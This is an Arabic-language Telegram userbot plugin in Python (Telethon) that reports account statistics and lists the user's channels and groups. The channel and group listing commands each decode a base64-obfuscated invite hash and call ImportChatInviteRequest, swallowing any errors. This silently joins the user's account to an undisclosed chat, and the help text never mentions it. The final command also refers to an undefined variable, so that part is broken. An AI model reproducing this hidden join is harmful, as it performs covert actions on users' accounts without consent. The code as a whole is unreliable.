import base64
import time

from telethon.tl.custom import Dialog
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from telethon.tl.types import Channel, Chat, User

# =========================================================== #
#                           safeina                        #
# =========================================================== #
STAT_INDICATION = "**⌔∮ يتم جمع معلومات حسابك. **"
CHANNELS_STR = "**💡⪼ قائمـه بجميـع القنوات التي أنت متواجـد :**\n\n"
CHANNELS_ADMINSTR = "**💡⪼ قائمـه بجميـع القنوات التي أنت مشـرف فيها :**\n\n"
CHANNELS_OWNERSTR = "**💡⪼ قائمـه بجميـع القنوات التي أنت مالك فيها :**\n\n"
GROUPS_STR = "**🏮⪼ قائمـه بجميـع الكـروبات التي أنت متواجـد فيها :**\n\n"
GROUPS_ADMINSTR = "**🏮⪼ قائمـه بجميـع الكـروبات التي أنت مشـرف فيها :**\n\n"
GROUPS_OWNERSTR = "**🏮⪼ قائمـه بجميـع الكـروبات التي أنت مالك فيها :**\n\n"
# =========================================================== #
#                                                             #
# =========================================================== #


@bot.on(admin_cmd(pattern="احصائياتي$"))
@bot.on(sudo_cmd(pattern="احصائياتي$", allow_sudo=True))
async def stats(event):
    ics = await edit_or_reply(event, STAT_INDICATION)
    start_time = time.time()
    private_chats = 0
    bots = 0
    groups = 0
    broadcast_channels = 0
    admin_in_groups = 0
    creator_in_groups = 0
    admin_in_broadcast_channels = 0
    creator_in_channels = 0
    unread_mentions = 0
    unread = 0
    dialog: Dialog
    async for dialog in event.client.iter_dialogs():
        entity = dialog.entity
        if isinstance(entity, Channel) and entity.broadcast:
            broadcast_channels += 1
            if entity.creator or entity.admin_rights:
                admin_in_broadcast_channels += 1
            if entity.creator:
                creator_in_channels += 1
        elif (
            isinstance(entity, Channel)
            and entity.megagroup
            or not isinstance(entity, Channel)
            and not isinstance(entity, User)
            and isinstance(entity, Chat)
        ):
            groups += 1
            if entity.creator or entity.admin_rights:
                admin_in_groups += 1
            if entity.creator:
                creator_in_groups += 1
        elif not isinstance(entity, Channel) and isinstance(entity, User):
            private_chats += 1
            if entity.bot:
                bots += 1
        unread_mentions += dialog.unread_mentions_count
        unread += dialog.unread_count
    stop_time = time.time() - start_time
    full_name = inline_mention(await event.client.get_me())
    response = f"𓆩 𝑺𝑶𝑼𝑹𝑪𝑬 𝑺𝑨𝑭𝑬𝑰𝑵𝑨 𖠢 𓆪\n𓍹ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ𓍻\n **⌔∮ معلومات عن - {full_name}** \n\n"
    response += f"**⌔∮ الدردشات الخاصه :** {private_chats} \n"
    response += f"   - المستخدمين : `{private_chats - bots}` \n"
    response += f"   - البوتات : `{bots}` \n"
    response += f"**⌔∮ المجموعات :** {groups} \n"
    response += f"**⌔∮ القنوات :** {broadcast_channels} \n"
    response += f"**⌔∮ مشرف في المجموعه :** {admin_in_groups} \n"
    response += f"`   - منشئ المجموعه : {creator_in_groups}` \n"
    response += (
        f"`   - رافع مشرفين في المجموعه : {admin_in_groups - creator_in_groups}` \n"
    )
    response += f"⌔∮ مشرف في قناة : {admin_in_broadcast_channels} \n"
    response += f"`   - منشئ القناة: {creator_in_channels}` \n"
    response += f"`   - رفع مشرفين في القناة : {admin_in_broadcast_channels - creator_in_channels}` \n"
    response += f"**⌔∮ الرسائل الغـير مقروئه :** {unread} \n"
    response += f"**⌔∮ الرسائل التي عمل لها غيـر مقروئه :** {unread_mentions} \n"
    response += (
        f"**⌔∮ الوقت المستغرق :** {stop_time:.02f}ثانيه \n𓍹ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ𓍻"
    )
    await ics.edit(response)


@bot.on(admin_cmd(pattern="قنواتي (عام|مشرف|مالك)$"))
@bot.on(sudo_cmd(pattern="قنواتي (عام|مشرف|مالك)$", allow_sudo=True))
async def stats(event):
    if event.fwd_from:
        return
    icscmd = event.pattern_match.group(1)
    icsevent = await edit_or_reply(event, STAT_INDICATION)
    start_time = time.time()
    ics = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    hi = []
    hica = []
    hico = []
    async for dialog in event.client.iter_dialogs():
        entity = dialog.entity
        if isinstance(entity, Channel) and entity.broadcast:
            hi.append([entity.title, entity.id])
            if entity.creator or entity.admin_rights:
                hica.append([entity.title, entity.id])
            if entity.creator:
                hico.append([entity.title, entity.id])
    if icscmd == "عام":
        output = CHANNELS_STR
        for k, i in enumerate(hi, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = CHANNELS_STR
    elif icscmd == "مشرف":
        output = CHANNELS_ADMINSTR
        for k, i in enumerate(hica, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = CHANNELS_ADMINSTR
    elif icscmd == "مالك":
        output = CHANNELS_OWNERSTR
        for k, i in enumerate(hico, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = CHANNELS_OWNERSTR
    stop_time = time.time() - start_time
    try:
        ics = Get(ics)
        await event.client(ics)
    except BaseException:
        pass
    output += f"\n**⪼ الوقت المستغرق : ** {stop_time:.02f}ثانيه"
    try:
        await icsevent.edit(output)
    except Exception:
        await edit_or_reply(
            icsevent,
            output,
            caption=caption,
        )


@bot.on(admin_cmd(pattern="كروباتي (عام|مشرف|مالك)$"))
@bot.on(sudo_cmd(pattern="كروباتي (عام|مشرف|مالك)$", allow_sudo=True))
async def stats(event):
    if event.fwd_from:
        return
    icscmd = event.pattern_match.group(1)
    icsevent = await edit_or_reply(event, STAT_INDICATION)
    start_time = time.time()
    ics = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    hi = []
    higa = []
    higo = []
    async for dialog in event.client.iter_dialogs():
        entity = dialog.entity
        if isinstance(entity, Channel) and entity.broadcast:
            continue
        elif (
            isinstance(entity, Channel)
            and entity.megagroup
            or not isinstance(entity, Channel)
            and not isinstance(entity, User)
            and isinstance(entity, Chat)
        ):
            hi.append([entity.title, entity.id])
            if entity.creator or entity.admin_rights:
                higa.append([entity.title, entity.id])
            if entity.creator:
                higo.append([entity.title, entity.id])
    if icscmd == "عام":
        output = GROUPS_STR
        for k, i in enumerate(hi, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = GROUPS_STR
    elif icscmd == "مشرف":
        output = GROUPS_ADMINSTR
        for k, i in enumerate(higa, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = GROUPS_ADMINSTR
    elif icscmd == "مالك":
        output = GROUPS_OWNERSTR
        for k, i in enumerate(higo, start=1):
            output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
        caption = GROUPS_OWNERSTR
    stop_time = time.time() - start_time
    try:
        ics = Get(ics)
        await event.client(ics)
    except BaseException:
        pass
    output += f"\n**⪼ الوقت المستغرق : ** {stop_time:.02f}s"
    try:
        await icsevent.edit(output)
    except Exception:
        await edit_or_reply(
            icsevent,
            output,
            caption=caption,
        )


@bot.on(admin_cmd(pattern="احصائياته ?(.*)"))
@bot.on(sudo_cmd(pattern="احصائياته ?(.*)", allow_sudo=True))
async def _(event):
    if event.fwd_from:
        return
    input_str = "".join(event.text.split(maxsplit=1)[1:])
    reply_message = await event.get_reply_message()
    if not input_str and not reply_message:
        await edit_delete(
            event,
            "`reply to  user's text message to get name/username history or give userid/username`",
        )
    if input_str:
        try:
            uid = int(input_str)
        except ValueError:
            try:
                u = await event.client.get_entity(input_str)
            except ValueError:
                await edit_delete(
                    event, "`Give userid or username to find name history`"
                )
            uid = u.id
    else:
        uid = reply_message.sender_id
    chat = "@tgscanrobot"
    await edit_or_reply(event, "`Processing...`")
    async with event.client.conversation(chat) as conv:
        try:
            await conv.send_message(f"{uid}")
        except Exception:
            await edit_delete(catevent, "`unblock `@tgscanrobot` and then try`")
        response = await conv.get_response()
        await event.client.send_read_acknowledge(conv.chat_id)
        await catevent.edit(response.text)


def inline_mention(user):
    full_name = user_full_name(user) or "No Name"
    return f"[{full_name}](tg://user?id={user.id})"


def user_full_name(user):
    names = [user.first_name, user.last_name]
    names = [i for i in list(names) if i]
    return " ".join(names)


CMD_HELP.update(
    {
        "معلومات": "**اسم الاضافـه : **`معلومات`\
    \n\n    **╮•❐ الامـر ⦂ **`.احصائياتي`\
    \n  •  **الشـرح •• **__يظهر لك عدد مجموعاتك وقنواتك ومحادثاتك الخاصة ... إلخ__\
    \n\n    **╮•❐ الامـر ⦂ **`.كروباتي (عام|مشرف|مالك)`\
    \n  •  **الشـرح •• **__يعرض لك قائمة بجميع المجموعات التي أنت فيها إذا كنت تستخدم الامر + عام ، وجميع المجموعات التي تكون مسؤولاً فيها إذا كنت تستخدم الامر + مشرف وجميع المجموعات التي أنشأتها إذا كنت تستخدم الامر + مالك__\
    \n\n    **╮•❐ الامـر ⦂ **`.قنواتي (عام|مشرف|مالك)`\
    \n  •  **الشـرح •• **__يعرض لك قائمة بجميع القنوات التي أنت فيها إذا كنت تستخدم الامر + عام ، وجميع القنوات التي تكون مسؤولاً فيها إذا كنت تستخدم الامر + مشرف وجميع القنوات التي أنشأتها إذا كنت تستخدم الامر + مالك__\
    \n\n    **╮•❐ الامـر ⦂ **`.احصائياته (بالرد/بالايدي/بالمعرف)`\
    \n  •  **الشـرح •• **__يظهر قائمة بالمجموعات العامة لهذا الشخص المحـدد بالامـر__\
    "
    }
)
